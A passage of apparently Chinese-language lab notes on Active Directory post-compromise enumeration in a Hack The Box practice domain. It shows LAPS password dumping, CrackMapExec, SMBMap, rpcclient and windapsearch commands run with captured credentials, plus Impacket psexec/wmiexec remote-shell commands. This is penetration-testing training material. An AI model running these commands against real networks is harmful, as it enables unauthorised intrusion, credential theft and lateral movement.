<h2 id="4-枚举LAPS"><a href="#4-枚举LAPS" class="headerlink" title="4. 枚举LAPS"></a>4. 枚举LAPS</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Find-LAPSDelegatedGroups</span><br><br>OrgUnit                                             Delegated Groups<br><span class="hljs-literal">-------</span>                                             <span class="hljs-literal">----------------</span><br>OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins<br>OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins<br>OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins<br>OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins<br>OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins<br>OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins<br>OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins<br>OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins<br>OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins<br>OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins<br>OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins<br>OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins<br>OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins<br>OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins<br>OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins<br>OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins<br>OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins<br>OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Find-AdmPwdExtendedRights</span><br><br>ComputerName                Identity                    Reason<br><span class="hljs-literal">------------</span>                <span class="hljs-literal">--------</span>                    <span class="hljs-literal">------</span><br>EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated<br>EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated<br>SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated<br>SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated<br>WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated<br>WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-LAPSComputers</span><br><br>ComputerName                Password       Expiration<br><span class="hljs-literal">------------</span>                <span class="hljs-literal">--------</span>       <span class="hljs-literal">----------</span><br>DC01.INLANEFREIGHT.LOCAL    <span class="hljs-number">6</span>DZ[+<span class="hljs-type">A</span>/[]<span class="hljs-number">19</span><span class="hljs-type">d</span><span class="hljs-variable">$F</span> <span class="hljs-number">08</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2020</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span>:<span class="hljs-number">45</span><br><span class="hljs-type">EXCHG01.INLANEFREIGHT.LOCAL</span> <span class="hljs-type">oj</span>+<span class="hljs-number">2</span><span class="hljs-type">A</span>+[<span class="hljs-type">hHMMtj</span>, <span class="hljs-number">09</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2020</span> <span class="hljs-number">00</span>:<span class="hljs-number">51</span>:<span class="hljs-number">30</span><br><span class="hljs-type">SQL01.INLANEFREIGHT.LOCAL</span>   <span class="hljs-number">9</span><span class="hljs-type">G</span><span class="hljs-comment">#f;p41dcAe,s 09/26/2020 00:30:09</span><br><span class="hljs-type">WS01.INLANEFREIGHT.LOCAL</span>    <span class="hljs-type">TCaG</span>-<span class="hljs-type">F</span>)<span class="hljs-number">3</span><span class="hljs-type">No</span>;<span class="hljs-type">l8C</span> <span class="hljs-number">09</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2020</span> <span class="hljs-number">00</span>:<span class="hljs-number">46</span>:<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure>

<h1 id="获取一个域用户凭据后的枚举"><a href="#获取一个域用户凭据后的枚举" class="headerlink" title="获取一个域用户凭据后的枚举"></a>获取一个域用户凭据后的枚举</h1><h2 id="1-CME-域用户-组-已登录用户-share枚举"><a href="#1-CME-域用户-组-已登录用户-share枚举" class="headerlink" title="1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举"></a>1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --<span class="hljs-built_in">users</span><br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --<span class="hljs-built_in">groups</span><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0<br><br>&lt;SNIP&gt;<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0<br><br>&lt;SNIP&gt;<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users<br><br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)<br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)<br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon <span class="hljs-built_in">users</span><br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01<br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01<br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01<br>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            <br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ <br></code></pre></td></tr></table></figure>

<p><strong>Spider Share</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share <span class="hljs-string">&#x27;Department Shares&#x27;</span><br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 <br>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:<br>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [<span class="hljs-string">&#x27;print$&#x27;</span>]<br>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [<span class="hljs-string">&#x27;ico&#x27;</span>, <span class="hljs-string">&#x27;lnk&#x27;</span>]<br>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200<br>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus<br></code></pre></td></tr></table></figure>

<h2 id="2-SMBMap-访问权限检查-递归目录"><a href="#2-SMBMap-访问权限检查-递归目录" class="headerlink" title="2. SMBMap - 访问权限检查&#x2F;递归目录"></a>2. SMBMap - 访问权限检查&#x2F;递归目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5<br><br>[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	Department Shares                                 	READ ONLY	<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	SYSVOL                                            	READ ONLY	Logon server share <br>	User Shares                                       	READ ONLY	<br>	ZZZ_archive                                       	READ ONLY<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R <span class="hljs-string">&#x27;Department Shares&#x27;</span> --dir-only<br><br>[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	Department Shares                                 	READ ONLY	<br>	.\Department Shares\*<br>	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.<br>	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..<br>	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting<br>	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives<br>	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance<br>	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR<br>	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT<br>	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal<br>	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing<br>	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations<br>	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&amp;D<br>	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp<br>	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse<br><br>    &lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="3-rpcclient-枚举"><a href="#3-rpcclient-枚举" class="headerlink" title="3. rpcclient 枚举"></a>3. rpcclient 枚举</h2><p>在查看 rpcclient 中的用户时，您可能会注意到每个用户旁边都有一个名为 <code>rid:</code> 的字段。相对标识符（RID）是 Windows 用于跟踪和标识对象的唯一标识符（以十六进制格式表示）。为了解释这一点，让我们看看下面的示例：</p>
<ul>
<li>INLANEFREIGHT.LOCAL 域的 SID 是： <code>S-1-5-21-3842939050-3880317879-2865463114</code> 。</li>
<li>当在域内创建对象时，上述编号（SID）将与 RID 结合，生成一个用于表示该对象的唯一值。</li>
<li>因此，域用户 <code>htb-student</code> 具有 RID:[0x457] 十六进制 0x457 将等于十进制 <code>1111</code> ，其完整用户 SID 为： <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code> 。</li>
<li>这是 INLANEFREIGHT.LOCAL 域中 <code>htb-student</code> 对象独有的，您永远不会看到此配对值与该域或其他任何域中的另一个对象相关联。</li>
</ul>
<p>然而，你会发现有些账户无论在哪台主机上，其 RID 都是相同的。例如，域的内置管理员账户的 RID 为[administrator] rid:[0x1f4]，转换为十进制值后等于 <code>500</code> 。内置管理员账户的 RID 值始终为 <code>Hex 0x1f4</code> ，即 500。这一情况始终不变。由于此值对对象是唯一的，我们可以利用它从域中枚举更多关于该对象的信息。让我们再次尝试使用 rpcclient 进行操作，这次我们将针对 <code>htb-student</code> 用户进行一些挖掘。</p>
<h3 id="通过-RID-进行-RPCClient-用户枚举"><a href="#通过-RID-进行-RPCClient-用户枚举" class="headerlink" title="通过 RID 进行 RPCClient 用户枚举"></a>通过 RID 进行 RPCClient 用户枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; queryuser 0x457<br><br>        User Name   :   htb-student<br>        Full Name   :   Htb Student<br>        Home Drive  :<br>        Dir Drive   :<br>        Profile Path:<br>        Logon Script:<br>        Description :<br>        Workstations:<br>        Comment     :<br>        Remote Dial :<br>        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST<br>        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST<br>        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT<br>        Password last <span class="hljs-built_in">set</span> Time   :      Wed, 27 Oct 2021 12:26:52 EDT<br>        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT<br>        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT<br>        unknown_2[0..31]...<br>        user_rid :      0x457<br>        group_rid:      0x201<br>        acb_info :      0x00000010<br>        fields_present: 0x00ffffff<br>        logon_divs:     168<br>        bad_password_count:     0x00000000<br>        logon_count:    0x0000001d<br>        padding1[0..7]...<br>        logon_hrs[0..21]...<br></code></pre></td></tr></table></figure>

<h3 id="Enumdomusers-枚举域用户"><a href="#Enumdomusers-枚举域用户" class="headerlink" title="Enumdomusers 枚举域用户"></a>Enumdomusers 枚举域用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; enumdomusers<br><br>user:[administrator] rid:[0x1f4]<br>user:[guest] rid:[0x1f5]<br>user:[krbtgt] rid:[0x1f6]<br>user:[lab_adm] rid:[0x3e9]<br>user:[htb-student] rid:[0x457]<br>user:[avazquez] rid:[0x458]<br>user:[pfalcon] rid:[0x459]<br>user:[fanthony] rid:[0x45a]<br>user:[wdillard] rid:[0x45b]<br>user:[lbradford] rid:[0x45c]<br>user:[sgage] rid:[0x45d]<br>user:[asanchez] rid:[0x45e]<br>user:[dbranch] rid:[0x45f]<br>user:[ccruz] rid:[0x460]<br>user:[njohnson] rid:[0x461]<br>user:[mholliday] rid:[0x462]<br><br>&lt;SNIP&gt;  <br></code></pre></td></tr></table></figure>

<h2 id="4-Impacket-工具包"><a href="#4-Impacket-工具包" class="headerlink" title="4. Impacket 工具包"></a>4. Impacket 工具包</h2><h3 id="使用-psexec-py"><a href="#使用-psexec-py" class="headerlink" title="使用 psexec.py"></a>使用 psexec.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psexec.py inlanefreight.local/wley:<span class="hljs-string">&#x27;transporter@4&#x27;</span>@172.16.5.125  <br></code></pre></td></tr></table></figure>

<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmiexec.py inlanefreight.local/wley:<span class="hljs-string">&#x27;transporter@4&#x27;</span>@172.16.5.5 <br></code></pre></td></tr></table></figure>

<h2 id="5-Windapsearch"><a href="#5-Windapsearch" class="headerlink" title="5. Windapsearch"></a>5. Windapsearch</h2><h3 id="Windapsearch-域管理员-特权用户"><a href="#Windapsearch-域管理员-特权用户" class="headerlink" title="Windapsearch - 域管理员&#x2F;特权用户"></a>Windapsearch - 域管理员&#x2F;特权用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da<br><br>[+] Using Domain Controller at: 172.16.5.5<br>[+] Getting defaultNamingContext from Root DSE<br>[+]	Found: DC=INLANEFREIGHT,DC=LOCAL<br>[+] Attempting <span class="hljs-built_in">bind</span><br>[+]	...success! Binded as: <br>[+]	 u:INLANEFREIGHT\forend<br>[+] Attempting to enumerate all Domain Admins<br>[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>[+]	Found 28 Domain Admins:<br><br>cn: Administrator<br>userPrincipalName: administrator@inlanefreight.local<br><br>cn: lab_adm<br><br>cn: Matthew Morgan<br>userPrincipalName: mmorgan@inlanefreight.local<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU<br><br>[+] Using Domain Controller at: 172.16.5.5<br>[+] Getting defaultNamingContext from Root DSE<br>[+]     Found: DC=INLANEFREIGHT,DC=LOCAL<br>[+] Attempting <span class="hljs-built_in">bind</span><br>[+]     ...success! Binded as:<br>[+]      u:INLANEFREIGHT\forend<br>[+] Attempting to enumerate all AD privileged <span class="hljs-built_in">users</span><br>[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>[+]     Found 28 nested <span class="hljs-built_in">users</span> <span class="hljs-keyword">for</span> group Domain Admins:<br><br>cn: Administrator<br>userPrincipalName: administrator@inlanefreight.local<br><br>cn: lab_adm<br><br>cn: Angela Dunn<br>userPrincipalName: adunn@inlanefreight.local<br><br>cn: Matthew Morgan<br>userPrincipalName: mmorgan@inlanefreight.local<br><br>cn: Dorothy Click<br>userPrincipalName: dclick@inlanefreight.local<br><br>&lt;SNIP&gt;<br><br>[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL<br>[+]     Found 3 nested <span class="hljs-built_in">users</span> <span class="hljs-keyword">for</span> group Enterprise Admins:<br><br>cn: Administrator<br>userPrincipalName: administrator@inlanefreight.local<br><br>cn: lab_adm<br><br>cn: Sharepoint Admin<br>userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

